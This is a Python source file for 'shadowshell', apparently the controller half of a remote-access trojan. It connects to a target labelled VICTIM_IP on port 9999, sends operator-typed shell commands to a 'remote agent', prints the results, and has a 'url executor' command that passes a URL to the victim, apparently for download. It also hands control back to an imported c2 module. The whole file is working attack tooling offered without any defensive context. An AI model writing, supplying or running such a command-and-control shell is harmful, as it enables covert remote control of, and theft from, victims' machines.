import socket
import time

class ShellSpawn():

    def __init__(self): 
        self.sock = None
        self.PORT = 9999   
        self.BUFFER_SIZE = 2024 * 2024
        self.SEP = "<sep>"

    def sleepercom(self, VICTIM_IP): 
        try:
            self.sock = socket.socket() 
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            IP = VICTIM_IP
            self.sock.connect((VICTIM_IP, 9999)) 
            print(f"<shadowshell> Attemping connection to remote agent :{VICTIM_IP}...")
            cwd = self.sock.recv(self.BUFFER_SIZE).decode() 
            print(f"<shadowshell> Successful connection established on :{VICTIM_IP}")
        except socket.error as e:  
            print(f"<shadowshell> Critical socket error: [{e}] unable to establish connection on {VICTIM_IP}")  
            time.sleep(5) 
            dependiences() 
                
        print(f"Current directory is {cwd}") 
        while True: # command exec code 
            command = input(f"{cwd} $> ")
            command = command.strip() 
            if not command.strip(): 
                continue 

            if command.lower() == "url executor": 
                self.sock.send(command.encode()) 
                url = str(input("<URL> Enter URL: ")) 
                self.sock.send(url.encode()) 

            elif command.lower() == 'quit': 
                print("<shadowshell> Terminating connection.") 
                time.sleep(3) 
                self.sock.send(command.encode()) 
                self.sock.close() 
                dependiences() 
            else: 
                self.sock.send(command.encode()) 
                output = self.sock.recv(self.BUFFER_SIZE).decode() 
                results, cwd = output.split(self.SEP) 
                print(results) 



def dependiences(): 
    import c2 
    c2.main() 


   

